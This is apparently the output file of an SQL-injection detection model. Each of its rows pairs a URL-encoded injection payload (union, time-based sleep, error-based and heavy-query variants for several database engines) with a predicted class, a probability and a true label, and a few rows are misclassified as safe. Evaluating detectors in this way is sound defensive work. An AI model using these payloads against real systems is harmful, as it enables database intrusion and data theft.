request_id,url,payload,classification,probability,label
5d9ddd7c,,-3161%27%29%20or%208501%3D1796,unsafe,1.0,1
41877d28,,1%25%27%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29%20and%20%27%25%27%3D%27,unsafe,1.0,1
8ce81c4e,,-5534%20or%201983%3D5721%23,unsafe,1.0,1
b08e5dfe,,1%29%29%29%20and%206358%3D6735,unsafe,1.0,1
b657bb27,,1%27%29%20as%20uytv%20where%207875%3D7875%20or%207417%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,unsafe,1.0,1
20501dc6,,1%27%20in%20boolean%20mode%29%20and%208312%3Ddbms_pipe.receive_message%28chr%2869%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%7C%7Cchr%2868%29%2C5%29--,unsafe,1.0,1
6f3b35b0,,1%29%29%20as%20vrev%20where%204248%3D4248%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29--,unsafe,1.0,1
1e1b40d2,,1%22%29%29%20as%20tmpz%20where%207224%3D7224%20and%20make_set%283579%3D1045%2C1045%29--,unsafe,1.0,1
de8c4bca,,1%27%29%20where%208628%3D8628%20union%20all%20select%20null%2Cnull%2Cnull--,unsafe,1.0,1
c114ebf7,,1%27%7C%7C%28select%20%27ezse%27%20from%20dual%20where%203821%3D3821%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,unsafe,1.0,1
25f50ec5,,1%25%22%29%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29fzno%29%20and%20%28%22%25%22%3D%22,unsafe,1.0,1
c18c7bfa,,1%27%20in%20boolean%20mode%29%20and%202006%3D2006,unsafe,1.0,1
17abd418,,-1639%29%29%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113,unsafe,1.0,1
491d32f1,,-4923%22%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29,unsafe,1.0,1
e2ff17f7,,1%27%29%29%29%3Bselect%20%28case%20when%20%287980%3D3703%29%20then%207980%20else%207980%2A%28select%207980%20from%20information_schema.character_sets%29%20end%29%23,unsafe,1.0,1
37052d89,,1%29%20where%209860%3D9860%20and%204443%3D4111--,unsafe,1.0,1
40bfbd16,,1%27%20where%201673%3D1673%20and%204241%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%284241%3D4241%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--,unsafe,1.0,1
a299f36e,,1%22%29%29%20as%20vdbf%20where%207969%3D7969%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29--,unsafe,1.0,1
90a491e8,,-1603%27%29%29%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%28%27abmo%27%3D%27abmo,unsafe,1.0,1
5ff23d51,,1%27%29%29%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,unsafe,1.0,1
b50f907c,,-3822%22%29%29%20as%20dftp%20where%202817%3D2817%20union%20all%20select%202817%2C2817%2C2817%2C2817%2C2817%2C2817%23,unsafe,1.0,1
194089e8,,1%25%27%29%29%3Bcall%20regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%27%25%27%3D%27,unsafe,1.0,1
283c6e17,,-7562%29%20or%208571%3D8571--,unsafe,1.0,1
7ba3c741,,1%27%20where%207828%3D7828%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,unsafe,1.0,1
6e9b66f6,,1%25%27%29%29%29%20rlike%20sleep%285%29%23,safe,0.368185201334559,1
67129a61,,1%22%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29%20and%20%28%22gixv%22%3D%22gixv,unsafe,1.0,1
e27871ed,,1%20where%209361%3D9361%20and%207478%3D9170--,unsafe,1.0,1
be67d7a3,,1%25%22%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
cee92140,,-9535%22%20order%20by%201--,unsafe,1.0,1
e914ba49,,-3063%25%22%29%29%29%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3D4144%29%20then%201%20else%2,unsafe,1.0,1
94d98fe7,,1%22%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%28%22snwx%22%20like%20%22snwx,unsafe,1.0,1
f6371792,,1%27%29%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%27lfhx%27%3D%27lfhx,unsafe,1.0,1
e9ec1bc7,,1%27%7C%7C%28select%20%27eayf%27%20where%205431%3D5431%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29%29%7C%7C%27,unsafe,1.0,1
5945f077,,1%22%29%29%20as%20krro%20where%201050%3D1050%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29--,unsafe,1.0,1
4002df55,,1%22%20and%20make_set%284214%3D9503%2C9503%29%20and%20%22phjg%22%20like%20%22phjg,unsafe,1.0,1
5cd12ba1,,1%25%27%29%29%29%3Bcall%20regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%28%27%25%27%3D%27,unsafe,1.0,1
2c84410c,,1%22%29%29%20as%20dvpb%20where%206673%3D6673%3Bselect%20%2A%20from%20generate_series%286730%2C6730%2Ccase%20when%20%286730%3D9431%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,1.0,1
c581f4a7,,1%25%22%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
7359dd73,,1%27%29%20where%207658%3D7658%20union%20all%20select%20null%2Cnull%23,unsafe,1.0,1
982814e6,,-6597%27%2B%28select%20aewz%20where%204036%3D4036%20union%20all%20select%204036%2C4036%2C4036%2C4036%2C4036%2C4036%2C4036--,unsafe,1.0,1
2c8575bd,,1%27%7C%7C%28select%20%27iuud%27%20where%203687%3D3687%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,1.0,1
8dc68bb3,,1%22%29%29%20as%20uqem%20where%203521%3D3521%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,unsafe,1.0,1
351805ff,,-3343%27%7C%7C%28select%20%27ssvt%27%20where%205179%3D5179%20union%20all%20select%205179%2C5179%2C5179%2C5179%2C5179%2C5179%2C5179%2C5179--,unsafe,1.0,1
c336633a,,1%25%22%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3--,unsafe,1.0,1
820cdef0,,-4389%27%29%29%29%20or%20%281139%3D3499%29%2A3499%20and%20%28%28%28%27qoch%27%3D%27qoch,unsafe,1.0,1
8d0a9171,,1%25%22%20and%20sleep%285%29%20and%20%22%25%22%3D%22,unsafe,1.0,1
bf02a1e7,,1%25%27%29%29%20or%20char%28119%29%7C%7Cchar%28100%29%7C%7Cchar%2899%29%7C%7Cchar%28121%29%3Dregexp_substring%28repeat%28right%28char%281441%29%2C0%29%2C5000000000%29%2Cnull%29--,unsafe,1.0,1
b6a59ae5,,1%27%29%20as%20bscn%20where%206907%3D6907%3Bselect%20%28case%20when%20%281724%3D6528%29%20then%201724%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,unsafe,1.0,1
ed10dfd8,,1%22%29%20as%20hhxx%20where%203372%3D3372%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,unsafe,1.0,1
16f15e82,,1%25%22%29%29%29%3Bselect%20pg_sleep%285%29%20and%20%28%28%28%22%25%22%3D%22,unsafe,1.0,1
50171663,,1%27%20in%20boolean%20mode%29%3Bbegin%20user_lock.sleep%285%29%3B%20end%23,safe,0.058602222209987405,1
3d1433a5,,-6567%27%29%29%20union%20all%20select%203217%23,unsafe,1.0,1
313aaee4,,-2602%27%20union%20all%20select%205715%2C5715%2C5715%2C5715%2C5715%2C5715%2C5715%2C5715%2C5715--,unsafe,1.0,1
7f128a25,,1%22%20where%208672%3D8672%20union%20all%20select%20null%2Cnull%23,unsafe,1.0,1
983bd4aa,,1%29%29%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,unsafe,1.0,1
c20dc56a,,1%22%20where%201051%3D1051%20union%20all%20select%20null--,unsafe,1.0,1
14d4eb03,,1%27%29%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29fzno%29,unsafe,1.0,1
891445a2,,1%25%27%29%29%29%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%20and%20%28%28%28%27%25%27%3D%27,unsafe,1.0,1
42b24cd1,,-2582%27%2B%28select%20ggim%20where%205346%3D5346%20union%20all%20select%205346%2C5346%23,unsafe,1.0,1
673cda62,,1%25%27%3Bselect%20sleep%285%29%23,safe,0.20364816512473807,1
140335d0,,1%27%7C%7C%28select%20%27irfn%27%20where%208360%3D8360%3Bselect%20%28case%20when%20%283855%3D3855%29%20then%203855%20else%201/%28select%200%29%20end%29--,unsafe,1.0,1
a8d0a9db,,1%27%2B%28select%20nzij%20where%205456%3D5456%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%29%2B%27,unsafe,1.0,1
38cf6962,,1%27%29%29%20and%204241%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%284241%3D4241%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%27pydi%27%20like%20%27pydi,unsafe,1.0,1
a5da49dd,,-2743%20union%20all%20select%206757%2C6757%2C6757%2C6757%2C6757%2C6757--,unsafe,1.0,1
60e48528,,1%27%29%20where%202840%3D2840%3Bselect%20%28case%20when%20%284660%3D4660%29%20then%204660%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,unsafe,1.0,1
1242dee6,,-4745%22%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%22nifq%22%20like%20%22nifq,unsafe,1.0,1
22a01270,,1%29%29%20or%20elt%285873%3D5873%2Csleep%285%29%29%23,unsafe,1.0,1
b08f4508,,1%22%29%20where%209115%3D9115%3Bselect%20case%20when%208867%3D7630%20then%201%20else%20null%20end--,unsafe,1.0,1
fb9c9b9e,,1%27%7C%7C%28select%20%27bwqc%27%20from%20dual%20where%206897%3D6897%20and%20sleep%285%29%23,unsafe,1.0,1
22791e80,,1%25%27%29%29%20and%209660%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,1.0,1
603928fe,,-4669%22%20or%208571%3D8571--,unsafe,1.0,1
9ca00e25,,-9553%22%29%20as%20geih%20where%206453%3D6453%20or%208453%3D8159--,unsafe,1.0,1
4cece79c,,-5972%22%20or%208509%3D3448%23,unsafe,1.0,1
2f50161c,,1%27%29%20where%208255%3D8255%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,1.0,1
ada426f9,,1%22%29%29%20as%20fmul%20where%207827%3D7827%3Bwaitfor%20delay%20%270%3A0%3A5%27--,unsafe,1.0,1
dbae2832,,-1015%22%29%29%20union%20all%20select%206624%2C6624%23,unsafe,1.0,1
e4d0f0bb,,1%22%29%29%29%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%28%28%28%22dqou%22%20like%20%22dqou,unsafe,1.0,1
846c23b5,,-4215%29%20where%205782%3D5782%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%,unsafe,1.0,1
efc0a3f1,,1%22%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,1.0,1
6e1b8bf7,,-8735%27%29%29%20union%20all%20select%203262%2C3262%2C3262--,unsafe,1.0,1
8067c0dd,,1%22%20and%205556%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%22epxq%22%20like%20%22epxq,unsafe,1.0,1
eaed271a,,1%27%2B%28select%20%27rqok%27%20where%205074%3D5074%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%2B%27,unsafe,1.0,1
7c7019a9,,1%25%22%29%29%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29%20and%20%28%28%28%22%25%22%3D%22,unsafe,1.0,1
fdec2e11,,1%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
9b5e2e64,,1%27%2B%28select%20hrgu%20where%209587%3D9587%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29%29%2B%27,unsafe,1.0,1
c53a636c,,1%29%20where%203738%3D3738%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,unsafe,1.0,1
3d60c88e,,1%29%20where%209059%3D9059%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29--,unsafe,1.0,1
00065178,,1%25%27%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
f48a8ac7,,1%25%22%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%20and%20%22%25%22%3D%22,unsafe,1.0,1
6d7dab03,,1%27%29%29%29%3Bselect%20sleep%285%29%23,safe,0.368185201334559,1
41a8310a,,1%22%29%29%20as%20dshc%20where%209911%3D9911%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,1.0,1
69c16896,,1%27%29%29%20union%20all%20select%20null%2Cnull%23,unsafe,1.0,1
6ce32625,,-4230%22%29%29%29%20union%20all%20select%206962%2C6962%2C6962%2C6962%2C6962%2C6962%23,unsafe,1.0,1
8de81de7,,1%22%29%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%28%22oyfz%22%3D%22oyfz,unsafe,1.0,1
803ed8ad,,1%22%20where%205216%3D5216%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,1.0,1
cd7bc4ae,,1%25%22%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%22%25%22%3D%22,unsafe,1.0,1
d1e78fe6,,1%27%29%20where%207587%3D7587%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,unsafe,1.0,1
3df168ea,,1%27%29%29%20union%20all%20select%20null%23,unsafe,1.0,1
8f14364b,,1%25%22%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
34755bb8,,-2929%27%29%29%29%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%28%28%27nzmk%27%3D%27nzmk,unsafe,1.0,1
a7d7b42e,,1%27%29%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,unsafe,1.0,1
e0573e2d,,1%27%29%20as%20viex%20where%206242%3D6242%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29--,unsafe,1.0,1
1d5f2b2f,,1%22%29%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%20and%20%28%22qpzj%22%20like%20%22qpzj,unsafe,1.0,1
7ec09208,,-7568%22%29%29%29%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr,unsafe,1.0,1
8bc1c979,,1%27%2B%28select%20rdpe%20where%206553%3D6553%20or%20elt%286272%3D6272%2Csleep%285%29%29%29%2B%27,unsafe,1.0,1
d9dd85f9,,-4340%29%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%288505%3D8505,unsafe,1.0,1
9376eec9,,1%22%29%29%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%22quni%22%3D%22quni,unsafe,1.0,1
33932770,,1%29%20as%20lvfu%20where%205831%3D5831%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29--,unsafe,1.0,1
f7c79faf,,1%27%29%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29%20and%20%28%27gzpx%27%3D%27gzpx,unsafe,1.0,1
46192b1b,,1%29%29%20as%20ynzg%20where%201926%3D1926%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29--,unsafe,1.0,1
aae07be1,,1%25%22%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
48a5791f,,1%27%20where%209024%3D9024%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29--,unsafe,1.0,1
c3682c2d,,1%25%27%29%20and%202716%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,1.0,1
63a8456e,,1%25%22%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%22%25%22%3D%22,unsafe,1.0,1
3cef01e4,,1%27%29%29%20order%20by%201--,unsafe,1.0,1
c5ae4f9e,,1%27%29%29%20as%20qqvk%20where%201007%3D1007%3Bselect%20%2A%20from%20generate_series%283379%2C3379%2Ccase%20when%20%283379%3D1219%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,1.0,1
1e0f726c,,-1999%29%20union%20all%20select%201779%2C1779%2C1779%2C1779%2C1779%2C1779%2C1779%2C1779%2C1779%2C1779%23,unsafe,1.0,1
97f55e23,,1%22%29%29%29%20and%203580%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,unsafe,1.0,1
95bf16d6,,1%20where%206412%3D6412%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
354eee1d,,1%29%3Bselect%20pg_sleep%285%29--,safe,0.06597448862725039,1
91d3d844,,-2393%25%27%29%29%20union%20all%20select%202772--,unsafe,1.0,1
20d1b08d,,1%22%29%20as%20dgzf%20where%204834%3D4834%3Bselect%20%28case%20when%20%282161%3D4328%29%20then%202161%20else%202161%2A%28select%202161%20from%20mysql.db%29%20end%29%23,unsafe,1.0,1
564f50b1,,1%27%29%20and%20%28select%209067%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289067%3D9067%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%27qvrd%27%3D%27qvrd,unsafe,1.0,1
8f8f4c86,,-4005%27%20where%203963%3D3963%20or%20elt%281032%3D1032%2C3623%29--,unsafe,1.0,1
e6b9be48,,1%25%22%29%29%29%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29acdk%29%23,unsafe,1.0,1
00b1c4b7,,-6097%25%27%29%29%20union%20all%20select%203990%2C3990%2C3990%2C3990%2C3990%2C3990--,unsafe,1.0,1
3be209a6,,1%25%27%29%3Bselect%20pg_sleep%285%29--,safe,0.11978336903325115,1
e8f417e4,,1%27%29%29%3Bif%287899%3D7899%29%20select%207899%20else%20drop%20function%20zbbp--,unsafe,1.0,1
c79c8c2e,,1%22%29%29%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29%20and%20%28%28%22mmvu%22%3D%22mmvu,unsafe,1.0,1
0124348b,,1%22%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end%20and%20%28%22qkkn%22%20like%20%22qkkn,unsafe,1.0,1
bae9d3d7,,%28select%20%28case%20when%20%286581%3D6581%29%20then%201%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual%29,unsafe,1.0,1
69767c13,,-1737%27%20or%201570%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%281570%3D1570%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bcha,unsafe,1.0,1
7ffd7594,,1%27%2B%28select%20%27arqt%27%20where%202336%3D2336%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,unsafe,1.0,1
68facaa9,,1%27%29%29%20as%20nsfx%20where%209553%3D9553%20rlike%20sleep%285%29--,unsafe,1.0,1
fc3256f3,,1%22%20or%209643%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%22vwep%22%20like%20%22vwep,unsafe,1.0,1
ea14fa8e,,1%27%7C%7C%28select%20%27wszt%27%20from%20dual%20where%206854%3D6854%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%29%7C%7C%27,unsafe,1.0,1
60b02258,,1%29%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29,unsafe,1.0,1
27d79b81,,1%27%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%27nhuk%27%3D%27nhuk,unsafe,1.0,1
1b9a30e4,,1%25%27%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,unsafe,1.0,1
aca3747b,,1%29%20as%20auly%20where%204146%3D4146%20or%20elt%285873%3D5873%2Csleep%285%29%29%23,unsafe,1.0,1
8dfb7e4a,,1%27%29%29%29%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%20and%20%28%28%28%27egnv%27%20like%20%27egnv,unsafe,1.0,1
